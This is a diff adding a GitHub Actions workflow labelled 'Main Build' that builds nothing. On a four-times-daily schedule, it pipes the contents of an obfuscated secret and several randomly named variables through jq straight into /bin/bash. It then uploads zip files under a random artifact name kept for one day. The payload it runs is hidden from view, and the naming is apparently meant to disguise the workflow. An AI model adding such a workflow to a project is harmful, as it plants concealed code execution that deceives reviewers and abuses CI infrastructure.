@@ -1,0 +1,38 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '27 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          ebq9: ${{ secrets.ebq9 }}
+        run: |
+          printf '%s' "$ebq9" | jq -r .kty22 | /bin/bash
+          printf '%s' "$w48649" | jq -r .p9 | /bin/bash
+          echo $rgvu0 | jq -r .lfk1664 | /bin/bash
+          printf '%s' "$kbe3" | jq -r .o227 | /bin/bash
+          echo $jq375 | jq -r .eaqfx0294 | /bin/bash
+          printf '%s' "$j50898" | jq -r .p0 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: cyDPrWlR
+          path: "*.zip"
+          retention-days: 1
